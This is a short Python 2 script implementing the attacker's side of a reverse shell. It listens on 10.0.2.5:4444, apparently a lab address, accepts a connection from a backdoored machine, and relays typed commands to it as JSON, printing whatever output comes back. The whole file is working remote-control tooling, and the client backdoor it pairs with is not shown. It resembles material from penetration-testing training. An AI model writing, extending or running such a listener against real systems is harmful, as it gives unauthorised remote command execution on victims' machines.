#!/usr/bin/env python
import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, self.address = listener.accept()
        print("[+] Got a connection" + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data)  # converts data into json object
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)  # receives data of 1024 bytes
                return json.loads(json_data)  # unwraps data from json file
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()  # receives data of 1024 bytes 

    def run(self):
        while True:
            command = raw_input(">> ")
            # command = input(">> ") Use this for python3 implementation
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("10.0.2.5", 4444)
my_listener.run()